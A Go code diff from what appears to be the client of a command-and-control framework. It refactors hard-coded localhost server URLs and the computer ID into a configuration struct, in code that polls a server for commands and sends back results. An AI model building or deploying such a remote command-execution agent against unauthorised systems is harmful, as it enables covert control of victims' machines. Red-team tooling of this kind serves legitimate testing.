@@ -10,20 +10,18 @@ import (
 	"time"
 
 	"github.com/dobin/antnium/model"
-	"github.com/rs/xid"
 	log "github.com/sirupsen/logrus"
 )
 
 var ErrNoCommandsFound = errors.New("Server did not return any commands")
 
 type Client struct {
-	port        int
-	computerId  string
+	config      ClientConfig
 	commandExec CommandExec
 }
 
 func NewClient(port int) Client {
-	w := Client{port, xid.New().String(), MakeCommandExec()}
+	w := Client{MakeClientConfig(), MakeCommandExec()}
 	return w
 }
 
@@ -39,7 +37,7 @@ func (s Client) sendPing() {
 	arguments := make(model.CmdArgument)
 	arguments["msg"] = "ooy!"
 	response := make(model.CmdResponse)
-	command := model.NewCommand("ping", s.computerId, "0", arguments, response)
+	command := model.NewCommand("ping", s.config.ComputerId, "0", arguments, response)
 	s.sendCommand(command)
 }
 
@@ -77,7 +75,7 @@ func (s Client) requestAndExecute() {
 }
 
 func (s Client) getCommand() (model.CommandBase, error) {
-	url := "http://localhost:4444/getCommand/" + s.computerId
+	url := s.config.DestinationHost + s.config.CommandGetPath + s.config.ComputerId
 	resp, err := http.Get(url)
 	if err != nil {
 		return model.CommandBase{}, fmt.Errorf("Error requesting URL %s with error %s", url, err)
@@ -107,10 +105,10 @@ func (s Client) getCommand() (model.CommandBase, error) {
 }
 
 func (s Client) sendCommand(command model.CommandBase) error {
-	url := "http://localhost:4444/sendCommand"
+	url := s.config.DestinationHost + s.config.CommandSendPath
 
 	// Setup response
-	command.ComputerId = s.computerId
+	command.ComputerId = s.config.ComputerId
 	json, err := json.Marshal(command)
 	if err != nil {
 		return err
